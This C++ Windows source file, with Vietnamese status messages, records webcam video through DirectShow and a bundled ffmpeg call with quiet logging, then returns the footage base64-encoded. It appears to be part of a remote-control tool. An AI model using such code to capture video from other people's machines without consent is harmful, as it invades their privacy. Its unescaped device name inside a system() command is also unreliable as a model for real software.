#include <windows.h>
#include <fstream>
#include <vector>
#include <string>
#include <iostream>
#include <dshow.h>
#include <filesystem>
#include "Utils.h"

#pragma comment(lib, "strmiids.lib")
#pragma comment(lib, "ole32.lib")

using namespace std;

string BSTRToString(BSTR bstr) {
    int wslen = SysStringLen(bstr);
    int len = WideCharToMultiByte(CP_ACP, 0, (wchar_t*)bstr, wslen, NULL, 0, NULL, NULL);
    string str(len, '\0');
    WideCharToMultiByte(CP_ACP, 0, (wchar_t*)bstr, wslen, &str[0], len, NULL, NULL);
    return str;
}

string GetFirstWebcamName() {
    string webcamName = "";
    HRESULT hr;
    CoInitialize(NULL);

    ICreateDevEnum* pDevEnum = NULL;
    IEnumMoniker* pEnum = NULL;

    hr = CoCreateInstance(CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER, 
                          IID_ICreateDevEnum, (void**)&pDevEnum);
    
    if (SUCCEEDED(hr)) {
        hr = pDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEnum, 0);
        
        if (hr == S_OK) {
            IMoniker* pMoniker = NULL;
            if (pEnum->Next(1, &pMoniker, NULL) == S_OK) {
                IPropertyBag* pPropBag;
                hr = pMoniker->BindToStorage(0, 0, IID_IPropertyBag, (void**)&pPropBag);
                
                if (SUCCEEDED(hr)) {
                    VARIANT var;
                    VariantInit(&var);
                    hr = pPropBag->Read(L"FriendlyName", &var, 0);
                    if (SUCCEEDED(hr)) {
                        webcamName = BSTRToString(var.bstrVal);
                        VariantClear(&var);
                    }
                    pPropBag->Release();
                }
                pMoniker->Release();
            }
            pEnum->Release();
        }
        pDevEnum->Release();
    }
    CoUninitialize();
    return webcamName;
}
class WebcamMgr {
public:
    static string RecordVideo(int duration) {
        string cameraName = GetFirstWebcamName();
        if (!std::filesystem::exists("Tools\\ffmpeg.exe")) {
            cout << ">> [LOI] Thieu Tools\\ffmpeg.exe" << endl;
            return "";
        }

        if (cameraName.empty()) {
            cout << ">> [LOI] Khong tim thay Webcam nao tren may nay!" << endl;
            return "";
        }
        cout << ">> [INFO] Phat hien Webcam: " << cameraName << endl;
        
        string cmd = "Tools\\ffmpeg.exe -f dshow -i video=\"" + cameraName + "\" "
             "-t " + to_string(duration) + " " 
             "-vf scale=1920:1080 -r 30 -crf 23 -c:v libx264 -preset ultrafast "
             "-threads 2 "       
             "-loglevel quiet " 
             "-y webcam_out.mp4 > NUL 2>&1";
        cout << ">> [WebcamMgr] Dang quay.." << endl;
        
        int result = system(cmd.c_str());
        
        ifstream file("webcam_out.mp4", ios::binary | ios::ate);
        if (!file.is_open()) {
            cout << ">> [LOI] Quay loi (Khong thay file output)." << endl;
            return "";
        }

        streamsize size = file.tellg();
        file.seekg(0, ios::beg);
        
        if (size <= 0) return "";

        vector<char> buffer(size);
        if (file.read(buffer.data(), size)) {
            cout << ">> [WebcamMgr] Video size: " << size / 1024 << " KB." << endl;
            return Utils::Base64Encode((unsigned char*)buffer.data(), (int)size);
        }
        
        return "";
    }
};